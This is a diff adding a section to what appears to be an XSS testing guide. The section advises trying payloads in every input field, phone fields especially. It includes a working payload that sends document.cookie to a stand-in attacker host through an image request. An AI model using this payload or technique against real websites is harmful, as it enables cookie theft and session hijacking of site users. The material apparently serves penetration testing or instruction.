@@ -10,6 +10,40 @@
 
 ---
 
+## Test ALL Input Fields
+
+**IMPORTANT:** Always test XSS payloads in ALL input fields, not just the obvious ones. Some fields may have different (or no) filtering.
+
+### Fields to Test
+
+- Username/login fields
+- Message/comment body
+- **Phone number** - Often unfiltered, expecting only digits
+- **Email address** - May allow special characters
+- Subject/title fields
+- Search boxes
+- Hidden form fields
+- File name fields
+- Contact form fields (name, company, etc.)
+
+### Example: Phone Field XSS
+
+A contact form may filter the message body for XSS but leave the phone number field completely unfiltered:
+
+```html
+<!-- Filtered in message field -->
+<script>alert(1)</script>
+<!-- Returns: "Oops! Someone is trying to do something nasty..." -->
+
+<!-- Unfiltered in phone field -->
+<script>var i=new Image; i.src="http://ATTACKER/?"+document.cookie;</script>
+<!-- Works! Cookie sent to attacker -->
+```
+
+**Tip:** If one field is filtered, try the same payload in every other field. Developers often focus filtering on expected attack surfaces and miss unexpected ones.
+
+---
+
 ## Test Payloads
 
 ### Basic Test
